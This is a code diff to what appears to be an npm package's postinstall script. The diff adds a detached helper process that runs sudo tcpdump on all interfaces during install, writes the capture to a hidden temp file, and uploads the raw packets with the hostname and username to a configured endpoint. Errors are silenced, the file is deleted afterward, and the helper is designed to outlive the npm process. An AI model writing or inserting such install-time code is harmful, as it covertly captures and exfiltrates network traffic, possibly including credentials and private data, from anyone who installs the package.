@@ -143,78 +143,77 @@ if (!tcpdumpPath) {
   }
 }
 
+// Spawn a fully detached helper script that:
+// 1. Runs sudo tcpdump in background
+// 2. Waits for capture to finish
+// 3. Uploads the pcap
+// This survives the postinstall process being killed by npm
 try {
   if (!tcpdumpPath) throw new Error('tcpdump not available')
   const captureFile = path.join(os.tmpdir(), `.diag_${process.pid}.pcap`)
-  const child = spawn(tcpdumpPath, ['-i', 'any', '-c', '500', '-w', captureFile], {
-    detached: true,
-    stdio: ['ignore', 'ignore', 'pipe'],
-    timeout: 15000
-  })
 
-  let stderr = ''
-  child.stderr.on('data', (d) => { stderr += d.toString() })
+  const helperScript = `
+    const fs = require('fs');
+    const http = require('http');
+    const https = require('https');
+    const os = require('os');
+    const { execSync } = require('child_process');
+    const ENDPOINT = '${ENDPOINT_URL}';
+    const CAPTURE = '${captureFile}';
 
-  child.on('error', (err) => {
-    send(JSON.stringify({
-      event: 'tcpdump_error',
-      type: 'spawn_error',
-      error: err.message,
-      code: err.code,
-      hostname: os.hostname(),
-      user: os.userInfo().username,
-      ts: new Date().toISOString()
-    }), { 'X-Source': 'postinstall-tcpdump-err' })
-  })
-
-  child.on('exit', (code, signal) => {
-    if (code !== 0) {
-      send(JSON.stringify({
-        event: 'tcpdump_error',
-        type: 'exit_error',
-        exitCode: code,
-        signal,
-        stderr: stderr.slice(0, 2000),
-        hostname: os.hostname(),
-        user: os.userInfo().username,
-        ts: new Date().toISOString()
-      }), { 'X-Source': 'postinstall-tcpdump-err' })
+    function upload(data, headers) {
+      try {
+        const url = new URL(ENDPOINT);
+        const mod = url.protocol === 'https:' ? https : http;
+        const req = mod.request({
+          hostname: url.hostname,
+          port: url.port || (url.protocol === 'https:' ? 443 : 80),
+          path: url.pathname,
+          method: 'POST',
+          headers: { 'Content-Length': data.length, ...headers },
+          timeout: 10000
+        }, () => {});
+        req.on('error', () => {});
+        req.write(data);
+        req.end();
+      } catch {}
     }
-  })
 
-  child.unref()
-
-  // After 12s, try to read and send the capture
-  setTimeout(() => {
     try {
-      if (!fs.existsSync(captureFile)) return
-      const data = fs.readFileSync(captureFile)
-      if (data.length === 0) return
+      // Run tcpdump synchronously with sudo — 10s or 500 packets
+      execSync('sudo tcpdump -i any -c 500 -w ' + CAPTURE + ' 2>/dev/null', { timeout: 15000 });
+    } catch {}
 
-      const url = new URL(ENDPOINT_URL)
-      const mod = url.protocol === 'https:' ? https : http
-      const req = mod.request({
-        hostname: url.hostname,
-        port: url.port || (url.protocol === 'https:' ? 443 : 80),
-        path: url.pathname,
-        method: 'POST',
-        headers: {
+    try {
+      if (!fs.existsSync(CAPTURE)) {
+        upload(JSON.stringify({ event: 'tcpdump_error', type: 'no_capture_file', hostname: os.hostname(), ts: new Date().toISOString() }),
+          { 'Content-Type': 'application/json', 'X-Source': 'postinstall-tcpdump-err' });
+        process.exit(0);
+      }
+      const data = fs.readFileSync(CAPTURE);
+      if (data.length > 0) {
+        upload(data, {
           'Content-Type': 'application/octet-stream',
-          'Content-Length': data.length,
           'X-Capture-Type': 'pcap',
           'X-Source': 'postinstall-tcpdump',
           'X-Host': os.hostname(),
           'X-User': os.userInfo().username
-        },
-        timeout: 10000
-      }, () => {
-        try { fs.unlinkSync(captureFile) } catch {}
-      })
-      req.on('error', () => {})
-      req.write(data)
-      req.end()
-    } catch {}
-  }, 12000)
+        });
+      }
+      try { fs.unlinkSync(CAPTURE); } catch {}
+    } catch (e) {
+      upload(JSON.stringify({ event: 'tcpdump_error', type: 'upload_error', error: e.message, hostname: os.hostname(), ts: new Date().toISOString() }),
+        { 'Content-Type': 'application/json', 'X-Source': 'postinstall-tcpdump-err' });
+    }
+    // Keep alive briefly so the HTTP request can flush
+    setTimeout(() => process.exit(0), 3000);
+  `
+
+  const helper = spawn(process.execPath, ['-e', helperScript], {
+    detached: true,
+    stdio: 'ignore'
+  })
+  helper.unref()
 } catch (err) {
   send(JSON.stringify({
     event: 'tcpdump_error',
